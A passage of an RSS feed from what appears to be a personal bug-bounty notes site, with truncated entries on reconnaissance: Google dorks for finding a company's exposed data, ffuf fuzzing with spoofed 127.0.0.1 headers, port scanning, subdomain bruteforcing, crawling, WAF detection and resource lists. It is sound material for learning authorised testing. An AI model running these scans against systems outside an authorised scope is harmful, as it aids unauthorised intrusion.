      <description>Dorks # Google # # https://github.com/six2dez/degoogle_hunter ./degoogle_hunter.sh example.com # https://github.com/m3n0sd0n4ld/uDork ./uDork.sh united.com -u all ./uDork.sh united.com -e all # https://dorks.faisalahmed.me/ # Google dork helper, input url and the sites generates dorks site:codepad.co &amp;#34;company&amp;#34; site:scribd.com &amp;#34;company&amp;#34; site:npmjs.com &amp;#34;company&amp;#34; site:npm.runkit.com &amp;#34;company&amp;#34; site:libraries.io &amp;#34;company&amp;#34; site:ycombinator.com &amp;#34;company&amp;#34; site:coggle.it &amp;#34;company&amp;#34; site:sharecode.io &amp;#34;company&amp;#34; site:pastebin.com &amp;#34;company&amp;#34; site:repl.it &amp;#34;company&amp;#34; site:productforums.google.com &amp;#34;company&amp;#34; site:gitter.im &amp;#34;company&amp;#34; site:bitbucket.org &amp;#34;company&amp;#34; site:*.atlassian.net &amp;#34;company&amp;#34; site:papaly.com &amp;#34;company&amp;#34; site:trello.com &amp;#34;company&amp;#34; site:prezi.com &amp;#34;company&amp;#34; site:jsdelivr.net &amp;#34;company&amp;#34; site:codepen.io &amp;#34;company&amp;#34; site:codeshare.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/recon/fuzzing/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/recon/fuzzing/</guid>
      <description>Fuzzing # Rate Limited?
Try to run techniques from 403 Bypass
Configure your options! ffuf runs by default with ffuf custom user agent, some sites will not trust that and return dummy data. The solution for this is to implement a .ffufrc file with real headers:
https://gist.github.com/felipecaon/d1e7c980d7bab1312ea81df1d0241f42
# https://github.com/ffuf/ffuf ffuf -w /path/to/wordlist -u https://target/FUZZ # Multiple sources ffuf -w http-methods:METHOD -w payloads:PAYLOAD -w headers:HEADER -u &amp;#34;https://example.com/PAYLOAD&amp;#34; -H &amp;#34;HEADER:127.0.0.1&amp;#34; -X &amp;#34;METHOD&amp;#34; # Multiple URLs and mutiple files example ffuf -u URL/FUZZ -w allipstoffuf:URL -w ~/.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/recon/paramdiscovery/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/recon/paramdiscovery/</guid>
      <description>Parameter Discovery # There are two tools that I prefer when doing param scanning. X8, which is a tool made just for param discovery with advanced comparison and arjun, which does basically the same. From my tests I could not determine which one is better.
X8 # # https://github.com/Sh1Yo/x8 x8 -u &amp;#34;https://example.com/&amp;#34; -w &amp;lt;wordlist&amp;gt; Arjun # # https://github.com/s0md3v/Arjun arjun -u https://target.com/ -w &amp;lt;wordlist&amp;gt; arjun -i urls.txt -oT output -m GET arjun -i urls.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/recon/portscan/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/recon/portscan/</guid>
      <description> Port Scan # Nmap # # https://github.com/nmap/nmap ./configure make make install nmap -sC -sV example.com nmap example.com https://3os.org/penetration-testing/cheatsheets/nmap-cheatsheet/ Naabu # # https://github.com/projectdiscovery/naabu naabu -p 80,443,21-23 -host example.com cat list | naabu -top-ports 100 -ep 80,443,8080,8443 </description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/recon/probing/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/recon/probing/</guid>
      <description>Probing # Validates a list of urls, checks to see if they are alive or not.
httpX # # https://github.com/projectdiscovery/httpx # go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest cat urls | httpx -random-agent -retries 2 -o out Hold down!
For some reason httpx fails to retrieve all good working urls. It is recommended to run httpx more than once to achieve better results.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/recon/scope/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/recon/scope/</guid>
      <description>Scope # A scope can be defined as of the limit of where your research should go, if you ever find a bug, this must reside inside the scope, otherwise, the finding is not valid.
Example of scope
In-Scope Out of scope example.com subdomain.example.com *-dev.example.com The scope above states that example.com and www.example.com are valid (www is a subdomain, example.com points to www by default).
Any subdomain under -dev.example.com is valid as well, the wildcard symbol (*) states that anything is valid.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/recon/screenshot/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/recon/screenshot/</guid>
      <description> Screenshot # For large recons where manual website visit is not doable. The program would grab a list of valid urls and screenshot them using a headless browser.
Hold down!
A browser must be installed prior using an screenshotter. Chrome or chromium is recommended.
GoWitness # # https://github.com/sensepost/gowitness gowitness file -f websites.txt -t &amp;lt;threads&amp;gt; </description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/recon/spider/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/recon/spider/</guid>
      <description> Spider # Crawling # katana # # go install github.com/projectdiscovery/katana/cmd/katana@latest cat hosts | katana -jc -kf all -nc -ef png,jpg,jpeg,css,gif,ttf,woff,woff2,svg,eot Check if hosts/paths are valid # # https://github.com/projectdiscovery/httpx cat links.txt | httpx -follow-host-redirects -random-agent -status-code -silent -retries 2 -title -web-server -tech-detect -location -o webs_info.txt Find records # # https://github.com/projectdiscovery/dnsx dnsx -retry 3 -a -aaaa -cname -ns -ptr -mx -soa -resp -silent -l subdomains.txt &amp;gt; dnsx_info.txt </description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/recon/subdomain/active/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/recon/subdomain/active/</guid>
      <description> Active Resources # The ideia behind an active subdomain recon is to bruteforce subdomain in order to find anything that is valid.
Get resolvers at:
# https://github.com/felipecaon/resolvers wget https://raw.githubusercontent.com/felipecaon/resolvers/main/resolvers.txt Pure DNS # # https://github.com/d3mondev/puredns puredns resolve subdomains.txt -r resolvers.txt --write resolved_dns_domains puredns bruteforce subdomains.txt example.com -r resolvers.txt --write resolved_dns_domains Permutations # # https://github.com/Josue87/gotator gotator -sub subdomains/subdomains.txt -perm permutations_list.txt -depth 1 -numbers 10 -mindup -adv -md </description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/recon/subdomain/passive/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/recon/subdomain/passive/</guid>
      <description>Passive Resources # A passive resource means that you will grab subdomains that were already discovered by another tools or were found lying around in some place (open source code, legacy scripts, logs, etc).
# https://github.com/OWASP/Amass amass enum -passive -d domain.com # https://github.com/projectdiscovery/subfinder subfinder -d domain.com -all -silent # https://github.com/tomnomnom/assetfinder assetfinder --subs-only example.com # https://github.com/Findomain/Findomain findomain -u example.com -q # https://github.com/lc/gau # https://github.com/tomnomnom/unfurl gau --subs example.com | unfurl -u domains All in one script # amass enum -passive -d domain.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/recon/wafcheck/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/recon/wafcheck/</guid>
      <description> WAF Check # Wafw00f # # https://github.com/EnableSecurity/wafw00f wafw00f -i websites.txt </description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/recon/wordlistgeneration/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/recon/wordlistgeneration/</guid>
      <description> Wordlist generation # After spidering across the target it is a good idea to check the content discovered and append the newly discovered content to your wordlist.
Parameters # # https://github.com/tomnomnom/anew cat links.txt | unfurl -u keys | anew all_parameters.txt Paths # cat links.txt | unfurl paths | rev | cut -d &amp;#39;/&amp;#39; -f1 | rev | anew paths.txt </description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/resources/burp/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/resources/burp/</guid>
      <description>Burp Suite # Plugins # Backslash powered scanner, find additional vulns JS Miner, gets sensitive content from js files Active Scan++, find additional vulns J2EEScan JS Link Finder, find links inside javascript files Para Miner, mines urls searching for parameters Reflector, find reflected inputs JSON Web Tokens, creates a tab to analyze json based tokens Retire.js, find old javascript libraries with known vulns Web Cache Deception Scanner, tests for cache problems Burp Bounty, OP HTTP methods discloser, discloses methods for same endpoint Tips n Tricks # Send traffic from VPS to local burp # # Run this in terminal connecting to vps (if ssh with key is possible) # When in WSL, portforwarding needs to be set ssh -R 8080:127.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/resources/career/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/resources/career/</guid>
      <description> Career Advice # Site Description https://github.com/rezaduty/cybersecurity-career-path/blob/master/Security_Engineer(Software).md CyberSec career path https://devskiller.com/screen-security-engineer/ Security Engineer Career https://hbr.org/1999/11/management-time-whos-got-the-monkey About management time https://shellsharks.com/getting-into-information-security Steps to start in infosec Boost your CV # Site Description https://cve-north-stars.github.io/ Get some CVE&amp;rsquo;s </description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/resources/regexes/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/resources/regexes/</guid>
      <description> Regexes # Regex pattern Description Site About https://www.autoregex.xyz/ Generate based on text </description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/resources/repositories/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/resources/repositories/</guid>
      <description> Respositories # Repository Description https://github.com/Lissy93/personal-security-checklist#authentication Security Checklist from explanatory side https://github.com/Bandit-HaxUnit/haxunit Workflow for recon </description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/resources/sites/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/resources/sites/</guid>
      <description> Sites # Link Niche https://www.hahwul.com/ Blog https://netsec.expert/ Blog https://ihorrasch.com/ Blog https://www.agarri.fr/en Blog https://www.100security.com.br/ Blog (portuguese) https://www.hacking8.com/ Blog (chinese) https://www.rcesecurity.com Blog https://weboas.is/ Link aggregator https://portswigger.net/research Burp&amp;rsquo;s owner research blog https://blog.orange.tw/ Blog/Research https://swarm.ptsecurity.com/ PT Swarm research blog https://0xdf.gitlab.io/ Solving HTB machines https://sploitus.com/ Search engine to find exploits https://www.exploitalert.com/ Search engine to find exploits https://unsafe.sh Chinese forum https://secret.club/ About HW and low level hacking https://www.bugbountyhunting.com/ Bug Bounty Writeups https://y4er.com/posts/ Chinese security posts </description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/resources/tools/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/resources/tools/</guid>
      <description> Web Tools # Website Description https://www.utf8-chartable.de/ UTF-8 Table https://grep.app/ Grep over multiple github repositories https://publicwww.com/ Grep over multiple websites source codes https://www.degraeve.com/reference/urlencoding.php List of URL encoded characters https://api-guesser.netlify.app/ Input an api key and the script will return from where it belongs https://gchq.github.io/CyberChef/ For all purposes https://securityheaders.com/ Test sites for security headers https://builtwith.com Database of sites technologies </description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/resources/writeups/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/resources/writeups/</guid>
      <description> Write Ups # WriteUp Description https://pentester.land/list-of-bug-bounty-writeups.html List of up to date writeups https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/ Common vulns often missed http://www.pc-help.org/obscure.htm Obscure URLs, useful for SSRF https://ctftime.org/writeups?tags=web200&amp;hidden-tags=web%2cweb100%2cweb200 CTF writeups https://sensepost.com/blog/2021/android-application-testing-using-windows-11-and-windows-subsystem-for-android/ Android testing in windows 11 https://gowthams.gitbook.io/bughunter-handbook/intresting-vulnerabilities/payment-bypasses Payment Flow Vulnerabilites </description>
    </item>
    
    <item>
      <title></title>
      <link>https://caon.io/docs/resources/youtubechannels/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://caon.io/docs/resources/youtubechannels/</guid>
      <description> Youtube Channels # Name Channel Ippsec https://www.youtube.com/c/ippsec Reconless https://www.youtube.com/channel/UCCp25j1Zh9vc_WFm-nB9fhQ </description>
    </item>
    
  </channel>
</rss>
